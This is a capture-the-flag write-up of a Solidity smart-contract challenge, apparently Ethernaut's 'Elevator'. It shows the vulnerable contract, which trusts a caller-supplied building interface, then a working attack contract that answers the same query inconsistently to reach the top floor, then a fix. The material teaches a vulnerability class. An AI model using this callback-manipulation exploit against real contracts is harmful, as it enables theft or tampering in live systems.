**Description**
> This elevator won't let you reach the top of your building. Right?
> 
The goal of this challenge is to be able to reach the top floor of the building.

* Elevator.sol
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```
**Attack Vector**
The Building contract which contains the logic that can get your to the top is an external actor (msg.sender), which allows any caller to insert malicious code.

**Attack Scenario**
The attacker can just implement the building interface and call `goto` and specifies a target floor as an input.

- **Attack.sol**
```solidity=
// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IElevator {
    function goTo(uint256) external;
    function top() external view returns (bool);
}

contract Attack {
    IElevator private immutable target;
    uint256 count;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function pwn() external {
        target.goTo(1);
        require(target.top(), "not top");
    }

    function isLastFloor(uint256) external returns (bool) {
        count++;
        return count > 1;
    }
}
```

**Recommendation**
Consider having a separate Building contract that contains the logic of the elevator and do not rely on the caller to implement it.